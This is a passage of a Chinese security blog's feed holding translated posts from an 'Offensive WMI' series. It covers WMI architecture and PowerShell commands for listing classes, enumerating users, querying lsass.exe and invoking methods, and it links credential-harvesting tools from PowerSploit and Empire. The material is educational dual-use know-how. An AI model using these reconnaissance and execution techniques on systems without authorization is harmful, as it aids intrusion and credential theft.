通过注册表收集系统的有趣信息；</li><li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-WmiCommand.ps1">Invoke-WmiCommand.ps1</a>：Powersploit 是一个非常有用的脚本，它通过使用 WMI 作为纯 C2 通道将 Payload 存储在注册表中来帮助执行代码；</li><li><a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-SessionGopher.ps1">Invoke-SessionGopher.ps1</a>：从 PoweShell Empire 搜索和解密来自系统的 RDP、WinSCP、FileZilla、PuTTY 等会话信息。</li></ul><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>在收集有用数据时，注册表是攻击者的宝库。此外，注册表还可用于存储 Payload，作为理想的无文件攻击和持久性机制。在本系列的后面部分，我们将了解如何仅使用 WMI 和注册表来创建整个 C2 基础设施。现在已经完成了基础知识，在下一篇文章中，将从 WMI 的基本侦察开始。</p><p>敬请期待，我的朋友 \o/</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文翻译自：&lt;a href=&quot;https://0xinfection.github.io/posts/wmi-registry-part-3/&quot;&gt;Offensive WMI - Interacting with Windows Registry (</summary>
      
    
    
    
    <category term="安全技术" scheme="https://zeronohacker.github.io/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="PowerShell" scheme="https://zeronohacker.github.io/tags/PowerShell/"/>
    
    <category term="WMI" scheme="https://zeronohacker.github.io/tags/WMI/"/>
    
    <category term="注册表" scheme="https://zeronohacker.github.io/tags/%E6%B3%A8%E5%86%8C%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>WMI 攻击手法研究 - 探索命名空间、类和方法 (第二部分)</title>
    <link href="https://zeronohacker.github.io/2021/09/07/wmi-classes-methods-part-2/"/>
    <id>https://zeronohacker.github.io/2021/09/07/wmi-classes-methods-part-2/</id>
    <published>2021-09-07T14:35:33.000Z</published>
    <updated>2021-09-20T14:44:57.843Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本篇文章翻译自：<a href="https://0xinfection.github.io/posts/wmi-classes-methods-part-2/">Offensive WMI - Exploring Namespaces, Classes &amp; Methods (Part 2) :: 0xInfection’s Blog — Random ramblings of an Infected Geek.</a></p></blockquote><p><img src="https://image.zeronohacker.com/article/2021/09/07/cover.png" alt=""></p><p>本篇文章是 WMI 攻击手法研究的第二篇，主要研究  WMI 中的 3 个组件，在整篇文章中，我们将交替使用 WMI 和 CIM cmdlet，以便熟悉这两种 cmdlet 类型。</p><h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>让我们简单回顾一下命名空间是什么：</p><blockquote><p>命名空间结构信息类似于文件系统中文件夹，但是，与物理位置 (例如磁盘上) 不同，它们本质上更具有逻辑。</p></blockquote><p>WMI 中的所有命名空间都是 <code>__Namespace</code> 系统类的实例，要获取 <code>root</code> 命名空间下所有命名空间的列表，可使用以下命令查询同一个类：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> root <span class="literal">-Class</span> __Namespace</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/namespace_long.png" alt=""></p><p>输出的内容包含了许多信息，为了过滤掉 “无用” 信息，可使用 PowerShell 中的 <code>select</code>：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> root <span class="literal">-Class</span> __Namespace | <span class="built_in">select</span> name</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/namespace_short.png" alt=""></p><p>现在我们从系统中得到一个命名空间的列表，许多命名空间会是这样格式出现 <code>root\&lt;namespace&gt;</code>，比如 <code>root\DEFAULT</code>，<code>root\CIM2</code> 等等，因为它们是 root (本身也是一个命名空间) 下的命名空间。</p><blockquote><p>注意：一个奇怪而有趣的事实是，WMI 中的默认命名空间不是 root\DeFAULT 而是 root\CIMV2 (自 Windows 2000 以来一直是这样)。</p></blockquote><p>使用 CIM cmdlet <code>Get-CimInstance</code> 可以实现相同目的：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> root <span class="literal">-ClassName</span> __Namespace</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/namecim.png" alt=""></p><p>OK，上面已整整齐齐列出来了，那嵌套的名称空间呢？我们已经看到 root 命名空间下有几个命名空间，只需要编写一个脚本，递归地获取名称空间 (来自 <a href="https://powershellmagazine.com/2013/10/18/pstip-list-all-wmi-namespaces-on-a-system/">PSMag</a>)：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">Get-WmiNamespace</span></span> &#123;</span><br><span class="line">    <span class="keyword">Param</span> (</span><br><span class="line">        <span class="variable">$Namespace</span>=<span class="string">&#x27;root&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="variable">$Namespace</span> <span class="literal">-Class</span> __NAMESPACE | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">            (<span class="variable">$ns</span> = <span class="string">&#x27;&#123;0&#125;\&#123;1&#125;&#x27;</span> <span class="operator">-f</span> <span class="variable">$_</span>.__NAMESPACE,<span class="variable">$_</span>.Name)</span><br><span class="line">            <span class="built_in">Get-WmiNamespace</span> <span class="variable">$ns</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/nestedname.png" alt=""></p><blockquote><p>注意：类和命名空间可能因机器而异，具体取决于可用硬件、安装的应用程序和许多其它因素。</p></blockquote><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>现在我们有一个可用的命名空间列表，让我们来看看类，那么什么是类？</p><blockquote><p>WMI 类表示系统中的特定项，它可以是从系统进程到硬件 (比如网卡)、服务等任何内容。</p></blockquote><p>类分为 3 个主要类型 (这是 CIM 标准的要求)：</p><ul><li>Core classes (核心类)：适用于所有管理领域，并提供很少的基本功能，它们通常以双下划线开头 (比如 <code>__SystemSecrity</code>)；</li><li>Common classes (公共类)：这些是核心类的扩展，适用于特定的管理领域，以 CIM_ 为前缀 (比如 <code>CIM_TemperatureSensor</code>)；</li><li>Extended classes (扩展类)：这些是对基于技术堆栈的常见类的额外添加 (例如 Win32_Process)；</li></ul><p>类进一步分为以下类型：</p><ul><li>Abstract classes (抽象类)：定义新类的模板；</li><li>Static classes (静态类)：主要用于存储数据；</li><li>Dynamic classes (动态类)：从 Provider 取回数据，代表 WMI 托管资源，我们最感兴趣的是这种类型的类；</li><li>Association classes (关联类)：描述类和托管资源之间的关系；</li></ul><h3 id="2-1-列出类"><a href="#2-1-列出类" class="headerlink" title="2.1 列出类"></a>2.1 列出类</h3><p>有了足够的理论支撑，让我们尝试寻找一些类，我们可以使用 <code>Get-WmiObject cmdlet</code> 列出可用的类：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> * <span class="literal">-List</span></span><br></pre></td></tr></table></figure><p>上面这条命令将会列出所有类，但为了举例，假设我们对系统上的用户感兴趣。可以使用以下命令来缩小范围，该命令列出了用于获取或操作用户信息的所有可用类：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> *user* <span class="literal">-List</span></span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/userclasseswmi.png" alt=""></p><p>同样也可以使用 <code>Get-CimClass</code> 命令也能实现同样的效果，如下所示：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-CimClass</span> <span class="literal">-ClassName</span> *user*</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/userclassescim.png" alt=""></p><blockquote><p>注意：有关所有 Win32 类的列表，可以参考 Microsoft 的类文档。 Win32 Provider 提供 4 个不同类别的类：计算机系统硬件类、操作系统类、性能计数器类和 WMI 服务管理类。</p></blockquote><p>若要获取动态类，可以使用 <code>Get-CimClass</code> cmdlet 的 <code>-QualiferName</code> 参数：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-CimClass</span> <span class="literal">-ClassName</span> <span class="string">&quot;user&quot;</span> <span class="literal">-QualifierName</span> dynamic</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/dynamicclass.png" alt=""></p><p>看起来不错，下一步该如何操作？查询类以从中获取更多东西。</p><h3 id="获取类"><a href="#获取类" class="headerlink" title="获取类"></a>获取类</h3><p>我们对 <code>Win32_UserAccount</code> 类感兴趣，通过如下命令可简单获取数据：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> Win32_UserAccount</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/users.png" alt=""></p><blockquote><p>提示：要获得更详细的输出，可以将上述命令通过管道传输到 Powershell 的 <code>Format-List</code> 或 <code>fl</code> 中，例如：<code>Get-WmiObject -Class Win32_UserAccount | fl *</code> </p></blockquote><p>CIM cmdlet <code>Get-CimInstance</code> 能获取相同的信息：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_UserAccount</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/users2.png" alt=""></p><p>现在我们有了系统上所有用户帐户的列表！</p><p>让我们将注意力转向系统上运行的进程，Win32_Process 类为我们提供了系统上运行的进程列表：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> Win32_Process</span><br></pre></td></tr></table></figure><p>许多进程在系统上运行，这可能会使终端上显示的内容无休止地滚动，这种情况并不少见！为了避免这种情况，我们可以使用 <code>-Filter</code> 参数来获取我们正在寻找的特定进程 (这里选择了 <code>lsass.exe</code>)：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> Win32_Process <span class="literal">-Filter</span> <span class="string">&#x27;name=&quot;lsass.exe&quot;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/lsass.png" alt=""></p><p>在这种情况下，CIM cmdlet 替代方法 <code>Get-CimInstance</code> 提供了更短、更全面的输出 (并且它还支持 <code>-Filter</code> 参数)：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Process</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/processes.png" alt=""></p><p>对 WQL 执行相同操作的表达式如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Query</span> <span class="string">&#x27;select * from win32_process where name=&quot;lsass.exe&quot;&#x27;</span></span><br></pre></td></tr></table></figure><p>现在我们知道在 WMI 中列出、获取和过滤类的实例，让我们看看在 WMI 中删除实例是如何工作的。</p><h3 id="删除类实例"><a href="#删除类实例" class="headerlink" title="删除类实例"></a>删除类实例</h3><p><code>Remove-WmiObject</code> (WMI cmdlet) 和 <code>Remove-CimInstance</code> (CIM cmdlet) 是两个具有删除实例功能的 cmdlet。可以将相关命令的输出通过管道传输到 cmdlet。为了快速演示，运行计算器应用程序并列出过程。</p><p><img src="https://image.zeronohacker.com/article/2021/09/07/calc.png" alt=""></p><p>如果我们通过管道将命令传递给 Remove-CimInstance 会发生什么？ 进程被杀死！</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Process <span class="literal">-Filter</span> <span class="string">&#x27;name=&quot;calculator.exe&quot;&#x27;</span> | <span class="built_in">Remove-CimInstance</span></span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/killed.png" alt=""></p><p>这在处理 Registry 时非常有用，或者更好，在我们创建自己的类来存储我们的 Payloads 的情况下，我们可以简单地使用 cmdlet 列出类下的所有项目，从而将它们全部清理干净，一气呵成。</p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>方法可操作 WMI 对象，如果向上滚动到我们列出所有可用类的位置，你会注意到一个名为 Methods 的列，其中列出了可用的方法。</p><h3 id="列出方法"><a href="#列出方法" class="headerlink" title="列出方法"></a>列出方法</h3><p>要重复我们的工作并列出所有可用的方法，可以执行以下操作：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-CimClass</span> <span class="literal">-MethodName</span> *</span><br></pre></td></tr></table></figure><p>为了过滤掉允许我们执行特定方法的实例，可以传递一个方法名称，例如 Create (这总是很有趣，因为它可能允许我们创建一些东西)：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-CimClass</span> <span class="literal">-MethodName</span> Create</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/create.png" alt=""></p><p>进一步缩小范围，列出特定类的可用方法，需要使用 Powershell 的 <code>select</code> 和 <code>-ExpandProperty</code> 参数：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> Win32_Process <span class="literal">-List</span> | <span class="built_in">select</span> <span class="literal">-ExpandProperty</span> Methods</span><br><span class="line"><span class="built_in">Get-CimClass</span> <span class="literal">-ClassName</span> Win32_Process | <span class="built_in">select</span> <span class="literal">-ExpandProperty</span> CimClassMethods</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/classmethods.png" alt=""></p><blockquote><p>注意：传递给 select 语句的值是我们在列出类时得到的列的名称。如果你感到困惑，请向上滚动到我们列出类的部分，并观察 WMI 和 CIM cmdlet 输出之间的差异。</p></blockquote><p>因此，对于 Win32_Process 类，我们有 <code>Create</code>、<code>Terminate</code>、<code>GetOwner</code>、<code>GetOwnerSid</code> 等方法。现在让我们看看如何使用方法。</p><blockquote><p>提示：要使用一个方法，我们需要知道调用该方法时需要提供哪些参数。要列出所有可用参数，我们可以结合使用 Powershell，或者更好地阅读 <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/invoke-wmimethod?view=powershell-5.1#parameters">文档</a>。</p></blockquote><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p><code>Invoke-WmiMethod</code> (WMI) 和 <code>Invoke-CimMethod</code> (CIM cmdlet) 允许我们使用特定类的方法。又是拿计算器开刀：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Class</span> Win32_Process <span class="literal">-Name</span> Create <span class="literal">-ArgumentList</span> calc.exe</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/createcalc.png" alt=""></p><p>要使用 CIM cmdlet，语法略有不同：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-ClassName</span> Win32_Process <span class="literal">-MethodName</span> create <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;commandline=<span class="string">&quot;calc.exe&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/07/calccim.png" alt=""></p><h2 id="设置对象属性"><a href="#设置对象属性" class="headerlink" title="设置对象属性"></a>设置对象属性</h2><p>最后但并非最不重要的一点，我们应该看看更新类的实例。但是，重要的是要记住实例应该是可写的。通过编写一些脚本，我们可以编写一个获取类的所有可写属性的方法。这是脚本 (来自 <a href="https://powershellmagazine.com/2012/09/06/pstip-get-all-writeable-properties-of-a-wmi-class/">PSMag</a>)：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$class</span> = [<span class="type">wmiclass</span>]<span class="string">&#x27;&lt;class_name&gt;&#x27;</span></span><br><span class="line"><span class="variable">$class</span>.Properties | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$qualifier</span> <span class="keyword">in</span> <span class="variable">$_</span>.Qualifiers) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$qualifier</span>.Name <span class="operator">-eq</span> <span class="string">&quot;Write&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$_</span>.Name</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于我们的示例，我们将使用 <code>Win32_OperatingSystem</code> 类，该类具有一个名为 <code>Description</code> 的可写属性。</p><p><img src="https://image.zeronohacker.com/article/2021/09/07/osdesc.png" alt=""></p><p>让我们使用 <code>Set-WmiInstance</code> 将属性名称更新为 <code>PewOS</code>：</p><p><img src="https://image.zeronohacker.com/article/2021/09/07/updatedname.png" alt=""></p><p>使用 <code>Set-CimInstance</code> 也可以实现相同的效果，但这留给读者去探索。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>哇，又是一篇长文！到目前为止，我们已经对 WMI 和 CIM cmdlet 以及如何使用它们实现对系统的重要控制打下了坚实的基础，干杯! </p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本篇文章翻译自：&lt;a href=&quot;https://0xinfection.github.io/posts/wmi-classes-methods-part-2/&quot;&gt;Offensive WMI - Exploring Namespaces, Clas</summary>
      
    
    
    
    <category term="安全技术" scheme="https://zeronohacker.github.io/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="PowerShell" scheme="https://zeronohacker.github.io/tags/PowerShell/"/>
    
    <category term="WMI" scheme="https://zeronohacker.github.io/tags/WMI/"/>
    
  </entry>
  
  <entry>
    <title>WMI 攻击手法研究 - 基础篇 (第一部分)</title>
    <link href="https://zeronohacker.github.io/2021/08/31/wmi-basics-part-1/"/>
    <id>https://zeronohacker.github.io/2021/08/31/wmi-basics-part-1/</id>
    <published>2021-08-31T14:25:57.000Z</published>
    <updated>2021-09-20T14:34:43.107Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本篇文章翻译自：<a href="https://0xinfection.github.io/posts/wmi-basics-part-1/">Offensive WMI - The Basics (Part 1) :: 0xInfection’s Blog — Random ramblings of an Infected Geek.</a></p></blockquote><p><img src="https://image.zeronohacker.com/article/2021/08/31/cover.png" alt=""></p><p>这篇文章是有关 WMI 的多篇系列文章中的第一篇，如果读者对 PowerShell 有个基本的了解，那么对阅读本篇文章会有所帮助，但这不是必需的。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="为何是-WMI"><a href="#为何是-WMI" class="headerlink" title="为何是 WMI"></a>为何是 WMI</h3><p>WMI 是 Microsoft 的一组规范，旨在对 Windows 系统进行快速高效的管理。正如你可能知道的那样，一项安全规则表明任何对管理有用的东西也很容易被不法分子滥用，WMI 确实可以做很多事情 —— 从收集计算机状态和配置设置到运行应用程序和执行代码。此外，WMI 存在于所有可用的 Windows 操作系统版本中，因此这里的目标范围非常广泛。</p><h3 id="什么是-WMI"><a href="#什么是-WMI" class="headerlink" title="什么是 WMI"></a>什么是 WMI</h3><p>让我们快速回顾一些重要术语，WMI 是 Windows Management Instrumentation 的缩写，它是 Microsoft 对 CIM (Common Information Model，通用信息模型) 和 WBEM (Web-Based Enterprise Management，基于 Web 的企业管理) 的实现 —— 这两者都是 DMTF (Distributed Management Task Force，分布式管理任务组) 标准。WMI 为应用程序或脚本提供了一个整洁统一的界面来管理计算机 (可能是远程的，也可能是本地的) —— 包括进程、服务等。</p><h3 id="WMI-体系架构"><a href="#WMI-体系架构" class="headerlink" title="WMI 体系架构"></a>WMI 体系架构</h3><p>了解体系架构对于了解整个 WMI 生态系统的工作方式非常重要，WMI 架构如下所示 (源于 Graeber 在 BHUSA 15 的演讲)：</p><p><img src="https://image.zeronohacker.com/article/2021/08/31/arch.png" alt=""></p><p>让我们来逐一了解主要组件：</p><ul><li>Clients/Consumers：基本上是与 WMI 类交互 (查询数据、运行方法等) 终端。比较有代表性的客户端包括 <code>wmic.exe</code>、<code>wbemtest.exe</code>、<code>winrm.exe</code>、VBScript/JScript 和 ofc PowerShell cmdlets。</li><li>Query Languages：就像 SQL 提供查询数据库的方法一样，WMI 也有用于查询 WMI 服务的 WQL (WMI 查询语言) / CQL。在管理远程盒子方面，WBEM 标准开始发挥作用，其中包括 DCOM 和 WS-Man (如果你不理解这些术语，请不要担心，请继续阅读)。WQL 是 WMI 基础 SQL 语法，因此不区分大小写。一个简单查询 BIOS 信息语句如下：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> win32_bios</span><br></pre></td></tr></table></figure></li><li>Repositories：存储类的所有静态数据的数据库，存储库由 MOF (managed object format，托管对象格式) 文件定义，MOF 文件定义了结构、类、名称空间等，可以在 <code>%WINDIR%\System32\Wbem\Repository</code> 目录下找到数据库文件。<br><img src="https://image.zeronohacker.com/article/2021/08/31/repo.png" alt=""></li><li>MOF 文件：MOF 文件基本上用于定义 WMI 命名空间、类、provider 等，通常位于 <code>%WINDIR%\System32\Wbem</code> 下，扩展名为 MOF。在本系列的后续部分中，我们将了解如何编写自己的 MOF 文件来扩展 WMI 功能集。</li><li>Providers：可以在 WMI Providers 的帮助下访问存储库中定义的任何内容，它们通常是 Dll 文件，并与 MOF 文件 (cimwin32.dll、stdprov.dll 等) 关联。不过，它们也可以采用其它类型 (类、事件、事件使用者、方法等) 的形式。Providers 对生态系统至关重要，因为它们监视来自特定定义对象的事件和数据，比如驱动程序，它在托管对象和 WMI 之间提供了一个桥梁。在下面的截图中，dll 文件都有相对应的 MOF 文件：<br><img src="https://image.zeronohacker.com/article/2021/08/31/mof.png" alt=""></li><li>Managed Objects：上下文中资源的别名，即托管对象可以是 WMI 管理的服务、进程或操作系统。</li><li>Namespaces：简言之，名称空间是类的逻辑划分，便于发现和使用，分为 3 组 (system、core、extension) 和 3 个类型 (abstract、static、dynamic)，默认情况下具有代表性的名称空间是：root\cimv2、root\default、root\security、root\subscription 等。</li></ul><p>体系架构基本就是这样，现在，让我们来了解如何将 WMI 与 PowerShell 一起使用。</p><h2 id="用-PowerShell-来操作-WMI"><a href="#用-PowerShell-来操作-WMI" class="headerlink" title="用 PowerShell 来操作 WMI"></a>用 PowerShell 来操作 WMI</h2><p>现在我们已经完成了理论部分，让我们快速生成一个 PS 终端，请务必记住，在 PowerShell 的 v2 之前，只有少数 cmdlet 可以与 WMI 交互，检查 PowerShell 版本，并将版本更改为 2：</p><p><img src="https://image.zeronohacker.com/article/2021/08/31/version.png" alt=""></p><p>现在，让我们在 PowerShell 提示符中运行 <code>Get-Command--CommandType Cmdlet *wmi*</code> 命令：</p><p><img src="https://image.zeronohacker.com/article/2021/08/31/wmicmds.png" alt=""></p><p>提示：这些命令的名称是见名知意的 (稍后我们还会深入讨论)。在任何时候，都可以使用 Powershell 的标准语法：<code>help &lt;command&gt;</code> 来获取有关特定命令的更多信息。例如可能希望尝试帮助调用 WmiMethod 来查看该命令的功能，类似于 Linux 手册页。</p><p>从 PowerShell v3 开始，MS 引入了 CIM cmdlet，它利用 WS-MAN 和 CIM 标准来管理对象，访问 CIM cmdlet 在两种情况下具有优势：</p><ul><li>在 WMI/DCOM 本身被阻止运行 (可能是由于基于主机的防火墙规则？) 但启用了 WinRM/WS-MAN (Windows 远程管理) 的计算机中，我们仍然可以使用 CIM 来执行与 WMI  完全相同的操作。</li><li>CIM 本身是一个行业标准，是跨平台实现的，这意味着它也可以用于非 Windows 设备。</li></ul><p>DCOM：分布式组件对象模型的别名，DCOM 是网络计算机上软件组件之间通信的专有 Microsoft 协议。WMI 使用分布式 COM (DCOM) 连接到远程计算机。然而，DCOM 并不是那么友好的防火墙。</p><p>WS-MAN：WS-MAN 或 WS-Management 是一种 DMTF 标准，它为系统跨 IT 基础架构访问管理信息提供了一种通用方法。另一方面，WS-MAN 使用 HTTP，因此绝对是防火墙友好的。</p><p>我们将重做上面所做的，但在将 Powershell 版本更改回默认版本后 (在示例中使用了 Powershell v5)：</p><p><img src="https://image.zeronohacker.com/article/2021/08/31/cimcmds.png" alt=""></p><p>CIM cmdlet 可以做 WMI cmdlet 所能做的一切。如果我们希望映射 WMI cmdlet 和 CIM cmdlet 之间的功能，以下是两种类型之间功能比较的表格表示：</p><div class="table-container"><table><thead><tr><th>Use \ Types</th><th>WMI Cmdlets</th><th>CIM Cmdlets</th></tr></thead><tbody><tr><td>获取类的信息</td><td><code>Get-WmiObject</code></td><td><code>Get-CimInstance</code></td></tr><tr><td>调用方法</td><td><code>Invoke-WmiMethod</code></td><td><code>Invoke-CimMethod</code></td></tr><tr><td>订阅一个事件</td><td><code>Register-WmiEvent</code></td><td><code>Register-CimIndicationEvent</code></td></tr><tr><td>创建/更新类的实例</td><td><code>Set-WmiInstance</code></td><td><code>Set-CimInstance</code></td></tr><tr><td>删除类的实例</td><td><code>Remove-WmiObject</code></td><td><code>Remove-CimInstance</code></td></tr></tbody></table></div><h3 id="使用-PowerShell-进行-WMI-查询"><a href="#使用-PowerShell-进行-WMI-查询" class="headerlink" title="使用 PowerShell 进行 WMI 查询"></a>使用 PowerShell 进行 WMI 查询</h3><p>现在我们已经知道了可供我们使用的不同 cmdlet，我们可以尝试运行上面的示例 WQL 查询。我们已经知道 <code>Get WmiObject</code> 可以用来获取关于类的信息。因此，让我们使用 <code>-Query</code> 参数运行 cmdlet：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Query</span> <span class="string">&#x27;select * from win32_bios&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/08/31/wql.png" alt=""></p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>这篇文章旨在概述我们将在本系列的下一部分中处理的内容。这里有很多技术术语，但理解它们是必要的。我希望你喜欢阅读本篇文章，期待与你一起探索。</p><p>再见，朋友！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本篇文章翻译自：&lt;a href=&quot;https://0xinfection.github.io/posts/wmi-basics-part-1/&quot;&gt;Offensive WMI - The Basics (Part 1) :: 0xInfection’</summary>
      
    
    
    
    <category term="安全技术" scheme="https://zeronohacker.github.io/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="PowerShell" scheme="https://zeronohacker.github.io/tags/PowerShell/"/>
    
    <category term="WMI" scheme="https://zeronohacker.github.io/tags/WMI/"/>
    
  </entry>
  
  <entry>
    <title>从一个恶意活动中学习 PowerShell 解码</title>
    <link href="https://zeronohacker.github.io/2021/03/30/decoding-malious-powershell-activity-a-case-study/"/>
    <id>https://zeronohacker.github.io/2021/03/30/decoding-malious-powershell-activity-a-case-study/</id>
    <published>2021-03-30T13:50:59.000Z</published>
    <updated>2021-09-20T13:59:09.638Z</updated>
    
